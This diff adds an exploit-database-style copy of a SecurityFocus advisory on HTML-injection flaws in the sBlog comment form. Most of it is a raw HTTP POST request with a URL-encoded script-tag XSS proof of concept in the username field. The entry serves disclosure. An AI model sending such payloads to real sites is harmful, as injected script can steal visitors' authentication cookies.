@@ -1,0 +1,20 @@
+source: http://www.securityfocus.com/bid/17044/info
+ 
+sBlog is prone to HTML-injection vulnerabilities. The application fails to properly sanitize user-supplied input before using it in dynamically generated content. 
+ 
+Attacker-supplied HTML and script code would be executed in the context of the affected website, potentially allowing for the theft of cookie-based authentication credentials. An attacker could also exploit this issue to control how the site is rendered to the user; other attacks are also possible.
+
+POST /comments_do.php HTTP/1.1
+Host: www.example.com
+User-Agent: Mozilla/5.0 (Windows; U; Windows NT 5.1; it-IT; rv:1.7.12) Gecko/20050919 Firefox/1.0.7
+Accept: text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5
+Accept-Language: it,it-it;q=0.8,en-us;q=0.5,en;q=0.3
+Accept-Encoding: gzip,deflate
+Accept-Charset: ISO-8859-1,utf-8;q=0.7,*;q=0.7
+Keep-Alive: 300
+Connection: keep-alive
+Referer: http://www.example.com/comments.php?id=news_id
+Content-Type: application/x-www-form-urlencoded
+Content-Length: 99
+blog_id=3&username=%3Cscript%3Ealert%28%22XSS%22%29%3B%3C%2Fscript%3E&email=&homepage=&comment=test
+[....]
